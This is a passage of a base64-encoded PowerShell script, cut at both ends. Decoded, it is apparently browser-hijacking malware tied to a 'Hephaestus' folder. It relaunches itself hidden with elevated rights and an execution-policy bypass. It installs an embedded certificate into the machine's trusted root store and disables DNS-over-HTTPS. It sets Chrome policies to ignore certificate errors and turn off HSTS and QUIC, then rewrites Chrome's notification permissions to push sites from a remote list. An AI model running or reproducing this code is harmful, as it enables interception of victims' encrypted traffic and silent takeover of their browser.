gICApDQoNCmZ1bmN0aW9uIEdldC1TY3JpcHRQYXRoIHsNCiAgICAkc2NyaXB0UGF0aHMgPSBAKA0KICAgICAgICAjJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuRGVmaW5pdGlvbiwNCiAgICAgICAgJFBTQ29tbWFuZFBhdGgsDQogICAgICAgICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGgNCiAgICApDQogICAgDQogICAgZm9yZWFjaCAoJHBhdGggaW4gJHNjcmlwdFBhdGhzKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRwYXRoKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggew0KICAgICAgICB9DQogICAgfQ0KfQ0KZnVuY3Rpb24gQ3VzdG9tRGVjb2RlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGluQ29udGVudCwNCiAgICAgICAgW3N0cmluZ10kb3V0RmlsZQ0KICAgICkNCg0KICAgICMkc3RhbmRhcmRCYXNlNjRDaGFycyA9ICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvIg0KICAgICMkY3VzdG9tQmFzZTY0Q2hhcnMgICA9ICJRV0VSVFlVSU9QTEtKSEdGRFNBWlhDVkJOTWFzZGZnaGprbHF3ZXJ0eXVpb3B6eGN2Ym5tOTg3NjU0MzIxMCsvIg0KICAgIA0KICAgICMgJGRlY29kZWRCYXNlNjRTdHJpbmcgPSAkaW5Db250ZW50DQoNCiAgICAjICMgJGRlY29kZWRCYXNlNjRTdHJpbmcgPSAkZGVjb2RlZEJhc2U2NFN0cmluZyAtcmVwbGFjZSAoW3JlZ2V4XTo6RXNjYXBlKCRjdXN0b21CYXNlNjRDaGFycykpLCB7DQogICAgIyAjICAgICBwYXJhbSgkbWF0Y2gpDQogICAgIyAjICAgICAkc3RhbmRhcmRCYXNlNjRDaGFyc1skY3VzdG9tQmFzZTY0Q2hhcnMuSW5kZXhPZigkbWF0Y2guVmFsdWUpXQ0KICAgICN9DQoNCiAgICB0cnkgew0KICAgICAgICAkZGVjb2RlZEJ5dGVzID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRpbkNvbnRlbnQpDQogICAgICAgIFtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJG91dEZpbGUsICRkZWNvZGVkQnl0ZXMpDQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgV3JpdGUtRXJyb3IgIkZhaWxlZCB0byBkZWNvZGUgdGhlIGN1c3RvbSBCYXNlNjQgc3RyaW5nOiAkXyINCiAgICB9DQp9DQoNCg0KZnVuY3Rpb24gSXNEZWJ1ZyB7DQogICAgJGRlYnVnRmlsZSA9ICJDOlxkZWJ1Zy50eHQiDQogICAgDQogICAgdHJ5IHsNCiAgICAgICAgIyBDaGVjayBpZiB0aGUgZmlsZSBleGlzdHMNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkZGVidWdGaWxlIC1QYXRoVHlwZSBMZWFmKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWUNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICAjIENhdGNoIGFueSBlcnJvcnMgdGhhdCBvY2N1ciBkdXJpbmcgdGhlIFRlc3QtUGF0aCBvcGVyYXRpb24NCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCn0NCg0KJGdsb2JhbERlYnVnID0gSXNEZWJ1ZzsNCg0KZnVuY3Rpb24gd3JpdGVkYmcgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbXNnLCAgIFtzdHJpbmddJG1zZzI9IiINCiAgICApDQogICAgICAgIGlmICgkZ2xvYmFsRGVidWcpew0KICAgICAgICAgICAgV3JpdGUtSG9zdCAkbXNnICsgJG1zZzINCiAgICAgICAgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtSGVwaGFlc3R1c0ZvbGRlciB7DQogICAgJGFwcERhdGFQYXRoID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ0FwcGxpY2F0aW9uRGF0YScpDQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBKb2luLVBhdGggJGFwcERhdGFQYXRoICdIZXBoYWVzdHVzJw0KICAgIHJldHVybiAkaGVwaGFlc3R1c0ZvbGRlcg0KfQ0KDQpmdW5jdGlvbiBHZXQtSG9sZGVyUGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ2hvbGRlcicgKyAnLicgKyAncHMxJw0KICAgICRob2xkZXJQYXRoID0gSm9pbi1QYXRoICRoZXBoYWVzdHVzRm9sZGVyIC1DaGlsZFBhdGggJHNjcmlwdE5hbWUNCiAgICByZXR1cm4gJGhvbGRlclBhdGgNCn0NCg0KZnVuY3Rpb24gR2V0LUJvZHlQYXRoIHsNCiAgICAkaGVwaGFlc3R1c0ZvbGRlciA9IEdldC1IZXBoYWVzdHVzRm9sZGVyDQogICAgJHNjcmlwdE5hbWUgPSAnYm9keScgKyAnLicgKyAncHMxJw0KICAgICRib2R5UGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRib2R5UGF0aA0KfQ0KDQpmdW5jdGlvbiBUZXN0LUFyZ3sgcGFyYW0gKFtzdHJpbmddJGFyZykNCiAgICAkZ2xvYmFsQXJncyA9ICRnbG9iYWw6YXJncyAtam9pbiAnICcNCiAgICBpZiAoJGdsb2JhbEFyZ3MgLWxpa2UgIiokYXJnKiIpIHsNCiAgICAgICAgcmV0dXJuICR0cnVlDQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0gDQoNCg0KZnVuY3Rpb24gVGVzdC1BdXRvc3RhcnQgDQp7DQogICAgcmV0dXJuIFRlc3QtQXJnIC1hcmcgImF1dG9zdGFydCINCn0NCg0KDQpmdW5jdGlvbiBSdW5NZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRzY3JpcHQsIA0KICAgICAgICBbc3RyaW5nXSRhcmdOYW1lLA0KICAgICAgICBbc3RyaW5nXSRhcmdWYWx1ZSwNCiAgICAgICAgW2Jvb2xdJHVhYw0KICAgICkNCg0KICAgIHRyeSANCiAgICB7DQogICAgICAgICRzY3JpcHRQYXRoID0gJHNjcmlwdA0KICAgICAgICANCiAgICAgICAgJGxvY2FsID0gQCgiLUV4ZWN1dGlvblBvbGljeSIsICJCeXBhc3MiLCAiLUZpbGUiLCAiIiIkc2NyaXB0UGF0aCIiIikNCiAgICAgICAgDQogICAgICAgICRnbG9iYWxBcmdzID0gJGdsb2JhbDphcmdzDQogICAgICAgIGZvcmVhY2ggKCRnbG9iYWxBcmcgaW4gJGdsb2JhbEFyZ3MpIHsNCiAgICAgICAgICAgICRsb2NhbCArPSAiLUFyZ3VtZW50IGAiJGdsb2JhbEFyZ2AiIg0KICAgICAgICB9DQoNCiAgICAgICAgaWYgKC1ub3QgW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGFyZ05hbWUpKSB7DQogICAgICAgICAgICAkbG9jYWwgKz0gJGFyZ05hbWUNCiAgICAgICAgICAgICRsb2NhbCArPSAkYXJnVmFsdWUNCg0KICAgICAgICB9DQoNCiAgICAgICAgJGFyZ3VtZW50TGlzdCA9ICIiDQogICAgICAgIGZvciAoJGkgPSAwOyAkaSAtbHQgJGxvY2FsLkNvdW50OyAkaSArPSAyKSB7DQogICAgICAgICAgICAkYXJnID0gJGxvY2FsWyRpXQ0KICAgICAgICAgICAgJHZhbHVlID0gaWYgKCRpICsgMSAtbHQgJGxvY2FsLkNvdW50KSB7ICRsb2NhbFskaSArIDFdIH0gZWxzZSB7ICIiIH0NCiAgICAgICAgICAgICRhcmd1bWVudExpc3QgKz0gIiRhcmcgJHZhbHVlICINCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgkdWFjIC1lcSAkdHJ1ZSkgew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2FpdCAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW50TGlzdA0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2FpdCAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuIC1Bcmd1bWVudExpc3QgJGFyZ3VtZW50TGlzdA0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgICB3cml0ZWRiZyAiUnVuTWUgJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBJc0VsZXZhdGVkDQp7DQogICAgaWYgKC1OT1QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF0gW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikpDQogICAgew0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KICAgIHJldHVybiAkdHJ1ZQ0KfQ0KDQoNCmZ1bmN0aW9uIEdldC1FbnZQYXRocyB7DQogICAgJGEgPSBHZXQtTG9jYWxBcHBEYXRhUGF0aA0KICAgICRiID0gIEdldC1BcHBEYXRhUGF0aA0KICAgIHJldHVybiBAKCRhICwgJGIpDQp9DQoNCmZ1bmN0aW9uIEdldC1UZW1wRmlsZSB7DQogICAgJHRlbXBQYXRoID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQ0KICAgICR0ZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQogICAgcmV0dXJuICR0ZW1wRmlsZQ0KfQ0KDQpmdW5jdGlvbiBHZXQtTG9jYWxBcHBEYXRhUGF0aCB7DQogICAgcmV0dXJuIFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKFtTeXN0ZW0uRW52aXJvbm1lbnQrU3BlY2lhbEZvbGRlcl06OkxvY2FsQXBwbGljYXRpb25EYXRhKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtQXBwRGF0YVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpBcHBsaWNhdGlvbkRhdGEpDQp9DQoNCmZ1bmN0aW9uIEdldC1Qcm9maWxlUGF0aCB7DQogICAgcmV0dXJuIFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKFtTeXN0ZW0uRW52aXJvbm1lbnQrU3BlY2lhbEZvbGRlcl06OlVzZXJQcm9maWxlKQ0KfQ0KDQpmdW5jdGlvbiBDbG9zZS1Qcm9jZXNzZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ1tdXSRwcm9jZXNzZXMNCiAgICApDQoNCiAgICBmb3JlYWNoICgkcHJvY2VzcyBpbiAkUHJvY2Vzc2VzKSB7DQogICAgICAgICRjb21tYW5kID0gInRhc2traWxsLmV4ZSAvaW0gJHByb2Nlc3MgL2YiDQogICAgICAgIEludm9rZS1FeHByZXNzaW9uICRjb21tYW5kDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDZXJ0LVdvcmsgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSAkY29udGVudFN0cmluZw0KICAgICkNCiAgICAkb3V0cHV0RmlsZVBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIEN1c3RvbURlY29kZSAtaW5Db250ZW50ICRjb250ZW50U3RyaW5nIC1vdXRGaWxlICRvdXRwdXRGaWxlUGF0aA0KDQogICAgSW5zdGFsbC1DZXJ0aWZpY2F0ZVRvU3RvcmVzIC1DZXJ0aWZpY2F0ZUZpbGVQYXRoICRvdXRwdXRGaWxlUGF0aCAtUGFzc3dvcmQgJzEyMycNCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1DZXJ0aWZpY2F0ZVRvU3RvcmVzIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10gJENlcnRpZmljYXRlRmlsZVBhdGgsDQogICAgICAgIFtzdHJpbmddICRQYXNzd29yZA0KICAgICkNCg0KICAgIHRyeSB7DQogICAgICAgICRzZWN1cmVQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgLVN0cmluZyAkUGFzc3dvcmQgLUFzUGxhaW5UZXh0IC1Gb3JjZQ0KDQogICAgICAgICMgSW1wb3J0IGNlcnRpZmljYXRlIHRvIFBlcnNvbmFsIChNeSkgc3RvcmUNCiAgICAgICAgJHBlcnNvbmFsU3RvcmVQYXRoID0gIkNlcnQ6XExvY2FsTWFjaGluZVxNeSINCiAgICAgICAgSW1wb3J0LVBmeENlcnRpZmljYXRlIC1GaWxlUGF0aCAkQ2VydGlmaWNhdGVGaWxlUGF0aCAtQ2VydFN0b3JlTG9jYXRpb24gJHBlcnNvbmFsU3RvcmVQYXRoIC1QYXNzd29yZCAkc2VjdXJlUGFzc3dvcmQgLUVycm9yQWN0aW9uIFN0b3ANCiAgICAgICAgd3JpdGVkYmcgIkNlcnRpZmljYXRlIGluc3RhbGxlZCBzdWNjZXNzZnVsbHkgdG8gUGVyc29uYWwgc3RvcmUgKE15KS4iDQoNCiAgICAgICAgIyBJbXBvcnQgY2VydGlmaWNhdGUgdG8gUm9vdCBzdG9yZQ0KICAgICAgICAkcm9vdFN0b3JlUGF0aCA9ICJDZXJ0OlxMb2NhbE1hY2hpbmVcUm9vdCINCiAgICAgICAgSW1wb3J0LVBmeENlcnRpZmljYXRlIC1GaWxlUGF0aCAkQ2VydGlmaWNhdGVGaWxlUGF0aCAtQ2VydFN0b3JlTG9jYXRpb24gJHJvb3RTdG9yZVBhdGggLVBhc3N3b3JkICRzZWN1cmVQYXNzd29yZCAtRXJyb3JBY3Rpb24gU3RvcA0KICAgICAgICB3cml0ZWRiZyAiQ2VydGlmaWNhdGUgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseSB0byBSb290IHN0b3JlLiINCg0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0aHJvdyAiRmFpbGVkIHRvIGluc3RhbGwgY2VydGlmaWNhdGU6ICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fY2VydCB7DQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAkeGRhdGEuS2V5cykgew0KICAgICAgICAgICAgQ2VydC1Xb3JrIC1jb250ZW50U3RyaW5nICR4ZGF0YVska2V5XQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChDb25maWd1cmVDZXJ0aWZpY2F0ZXMpOiAkXyINCiAgICAgIH0NCn0NCg0KZnVuY3Rpb24gZG9fY2hyb21lIHsNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNcRG5zY2FjaGVcUGFyYW1ldGVycyIgLU5hbWUgIkVuYWJsZUF1dG9ET0giIC1WYWx1ZSAwDQoNCiAgICAkY2hyb21lS2V5UGF0aCA9ICJIS0xNOlxTb2Z0d2FyZVxQb2xpY2llc1xHb29nbGVcQ2hyb21lIg0KDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkY2hyb21lS2V5UGF0aCkpIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJGNocm9tZUtleVBhdGggLUZvcmNlIHwgT3V0LU51bGwNCiAgICB9DQoNCiAgICBOZXctSXRlbSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbCAgIyBDcmVhdGUgdGhlIGtleSBpZiBpdCBkb2Vzbid0IGV4aXN0DQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiQ29tbWFuZExpbmVGbGFnIiAtVmFsdWUgIi0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycyAtLWRpc2FibGUtcXVpYyAtLWRpc2FibGUtaHN0cyINCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRjaHJvbWVLZXlQYXRoIC1OYW1lICJEbnNPdmVySHR0cHMiIC1WYWx1ZSAib2ZmIg0KDQogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkY2hyb21lS2V5UGF0aCAtTmFtZSAiSWdub3JlQ2VydGlmaWNhdGVFcnJvcnMiIC1WYWx1ZSAxDQoNCiAgICB3cml0ZWRiZyAiQ2hyb21lIGNvbmZpZ3VyZWQiDQp9DQoNCg0KDQpmdW5jdGlvbiBDb21wYXJlLUFycmF5cyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbYXJyYXldJEFycmF5MSwNCiAgICAgICAgW2FycmF5XSRBcnJheTINCiAgICApDQoNCiAgICAjIFNvcnQgYm90aCBhcnJheXMgYW5kIGNvbXBhcmUNCiAgICAkYXJyYXkxU29ydGVkID0gJEFycmF5MSB8IFNvcnQtT2JqZWN0IHwgR2V0LVVuaXF1ZQ0KICAgICRhcnJheTJTb3J0ZWQgPSAkQXJyYXkyIHwgU29ydC1PYmplY3QgfCBHZXQtVW5pcXVlDQoNCiAgICAkam8xID0gJGFycmF5MVNvcnRlZCAtam9pbiAnLCcgDQogICAgDQogICAgJGpvMiA9ICRhcnJheTJTb3J0ZWQgLWpvaW4gJywnDQoNCiAgICAjIERldGVybWluZSBpZiB0aGUgYXJyYXlzIGFyZSBlcXVhbCAob3JkZXIgZG9lcyBub3QgbWF0dGVyKQ0KICAgIGlmICgkam8xIC1lcSAkam8yICkgew0KICAgICAgICByZXR1cm4gJHRydWUNCiAgICB9IGVsc2Ugew0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEhhdmVUb1B1c2hlcyB7DQogICAgJHJlc3VsdCA9ICRmYWxzZTsNCiAgICAkZXhpc3RzID0gQCgpDQogICAgJHRvc2V0ID0gQCgpDQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgIyBDaGVjayBpZiB0aGUgUHJlZmVyZW5jZXMgZmlsZSBleGlzdHMNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgICAgICAjIENoZWNrIGlmIHRoZSBzdHJ1Y3R1cmUgaXMgYXMgZXhwZWN0ZWQNCiAgICAgICAgaWYgKCRwcmVmZXJlbmNlc0NvbnRlbnQgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncyAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucykgew0KICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zDQoNCiAgICAgICAgICAgICMgSXRlcmF0ZSB0aHJvdWdoIGVhY2ggZW50cnkgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzDQogICAgICAgICAgICBmb3JlYWNoICgkZmllbGQgaW4gJG5vdGlmaWNhdGlvblNldHRpbmdzLlBTT2JqZWN0LlByb3BlcnRpZXMpIHsNCiAgICAgICAgICAgICAgICAkc2l0ZVVybCA9ICRmaWVsZC5OYW1lDQogICAgICAgICAgICAgICAgJGV4aXN0cyArPSBQdXNoRG9tYWluIC1wdXNoVXJsICRzaXRlVXJsDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICAkdG9zZXQgKz0gUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaA0KICAgIH0NCg0KICAgICAkcmVzdWx0ID0gLW5vdChDb21wYXJlLUFycmF5cyAtQXJyYXkxICRleGlzdHMgLUFycmF5MiAkdG9zZXQpDQogICAgDQogICAgcmV0dXJuICRyZXN1bHQ7DQp9DQoNCg0KZnVuY3Rpb24gUHVzaERvbWFpbiB7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KDQogICAgIyBUcmltIHRoZSBpbnB1dCBzdHJpbmcgYmVmb3JlIHRoZSBmaXJzdCBjb21tYQ0KICAgICR0cmltbWVkVXJsID0gJHB1c2hVcmwuVHJpbSgpLlNwbGl0KCcsJylbMF0uVHJpbSgpDQoNCiAgICAjIFBhcnNlIHRoZSBVUkkNCiAgICAkcGFyc2VkVXJpID0gW1N5c3RlbS5VcmldOjpuZXcoJHRyaW1tZWRVcmwpDQogICAgDQogICAgIyBFeHRyYWN0IGRvbWFpbiBhbmQgcG9ydA0KICAgICRkb21haW4gPSAkcGFyc2VkVXJpLkhvc3QNCiAgICAkcG9ydCA9IGlmICgkcGFyc2VkVXJpLlBvcnQgLWVxIC0xKSB7IDQ0MyB9IGVsc2UgeyAkcGFyc2VkVXJpLlBvcnQgfQ0KDQogICAgIyBDb25zdHJ1Y3QgdGhlIHJlc3VsdCBVUkwNCiAgICAkcmVzdWx0ID0gImh0dHBzOi8vIiArICRkb21haW4gKyAiOiIgKyAiJHBvcnQsKiINCiAgICANCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KDQpmdW5jdGlvbiBQdXNoRXhpc3RzDQp7DQogICAgcGFyYW0gKCRwdXNoVXJsKQ0KICAgIGZvcmVhY2ggKCRwdXNoIGluICRzZXJ2ZXIucHVzaGVzKSANCiAgICB7DQogICAgICAgIGlmICgoUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaFVybCkgLWVxIChQdXNoRG9tYWluIC1wdXNoVXJsICRwdXNoKSkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVB1c2hlcyB7DQogICAgJHByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgIyBDaGVjayBpZiB0aGUgUHJlZmVyZW5jZXMgZmlsZSBleGlzdHMNCiAgICBpZiAoVGVzdC1QYXRoICRwcmVmZXJlbmNlc1BhdGgpIHsNCiAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRwcmVmZXJlbmNlc1BhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgICAgICAjIENoZWNrIGlmIHRoZSBzdHJ1Y3R1cmUgaXMgYXMgZXhwZWN0ZWQNCiAgICAgICAgaWYgKCRwcmVmZXJlbmNlc0NvbnRlbnQgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUgLWFuZCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUuY29udGVudF9zZXR0aW5ncyAtYW5kICRwcmVmZXJlbmNlc0NvbnRlbnQucHJvZmlsZS5jb250ZW50X3NldHRpbmdzLmV4Y2VwdGlvbnMubm90aWZpY2F0aW9ucykgew0KICAgICAgICAgICAgJG5vdGlmaWNhdGlvblNldHRpbmdzID0gJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlLmNvbnRlbnRfc2V0dGluZ3MuZXhjZXB0aW9ucy5ub3RpZmljYXRpb25zDQoNCiAgICAgICAgICAgICRrZXlzVG9SZW1vdmUgPSBAKCkNCg0KICAgICAgICAgICAgIyBJdGVyYXRlIHRocm91Z2ggZWFjaCBlbnRyeSBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MNCiAgICAgICAgICAgIGZvcmVhY2ggKCRmaWVsZCBpbiAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcykgew0KICAgICAgICAgICAgICAgICRzaXRlVXJsID0gJGZpZWxkLk5hbWUNCiAgICAgICAgICAgICAgICAkcGVybWlzc2lvbiA9IChQdXNoRXhpc3RzIC1wdXNoVXJsICRzaXRlVXJsKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCRwZXJtaXNzaW9uIC1lcSAkZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgJGtleXNUb1JlbW92ZSArPSAkZmllbGQuTmFtZQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIHdyaXRlZGJnICIkc2l0ZVVybCBoYXNuJ3QgYmVlbiByZW1vdmVkLCBpdCBpcyBhIGdvb2Qgc2l0ZS4iDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBmb3JlYWNoICgka2V5IGluICRrZXlzVG9SZW1vdmUpIHsNCiAgICAgICAgICAgICAgICAkbm90aWZpY2F0aW9uU2V0dGluZ3MuUFNPYmplY3QuUHJvcGVydGllcy5SZW1vdmUoJGtleSkNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJHByZWZlcmVuY2VzQ29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMDAgfCBTZXQtQ29udGVudCAtUGF0aCAkcHJlZmVyZW5jZXNQYXRoIC1Gb3JjZQ0KDQogICAgICAgICAgICB3cml0ZWRiZyAiQWxsIHNlbGVjdGVkIHB1c2ggbm90aWZpY2F0aW9uIHNldHRpbmdzIGhhdmUgYmVlbiByZW1vdmVkLiINCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJObyBvciB1bmV4cGVjdGVkIG5vdGlmaWNhdGlvbiBzZXR0aW5ncyBmb3VuZCBpbiBQcmVmZXJlbmNlcyBmaWxlLiINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIHdyaXRlZGJnICJQcmVmZXJlbmNlcyBmaWxlIG5vdCBmb3VuZCBhdCBwYXRoOiAkcHJlZmVyZW5jZXNQYXRoIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQWRkLVB1c2hlc3sNCiAgICBmb3JlYWNoICgkcHVzaCBpbiAkc2VydmVyLnB1c2hlcykgew0KICAgICAgICBBZGQtUHVzaCAtcHVzaFVybCAkcHVzaCAtd29yayAkd29yaw0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQWRkLVB1c2ggew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kcHVzaFVybA0KICAgICkNCg0KICAgICRwdXNoRG9tYWluID0gUHVzaERvbWFpbiAtcHVzaFVybCAkcHVzaFVybA0KDQogICAgJGNocm9tZVByZWZlcmVuY2VzUGF0aCA9ICIkZW52OkxPQ0FMQVBQREFUQVxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxEZWZhdWx0XFByZWZlcmVuY2VzIg0KDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtUGF0aCAkY2hyb21lUHJlZmVyZW5jZXNQYXRoKSkgew0KICAgICAgICB3cml0ZWRiZyAiQ2hyb21lIHByZWZlcmVuY2VzIGZpbGUgbm90IGZvdW5kIGF0IHBhdGg6ICRjaHJvbWVQcmVmZXJlbmNlc1BhdGgiDQogICAgICAgIGV4aXQNCiAgICB9DQoNCiAgICAkcHJlZmVyZW5jZXNDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJGNocm9tZVByZWZlcmVuY2VzUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKC1ub3QgJHByZWZlcmVuY2VzQ29udGVudC5wcm9maWxlKSB7DQogICAgICAgICRwcmVmZXJlbmNlc0NvbnRlbnQgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBwcm9maWxlIC1WYWx1ZSBAe30NCiAgICB9DQoNCiAgICBpZiAoLW5vdCAkcHJlZmVyZW5jZXNDb250ZW50LnByb2ZpbGUu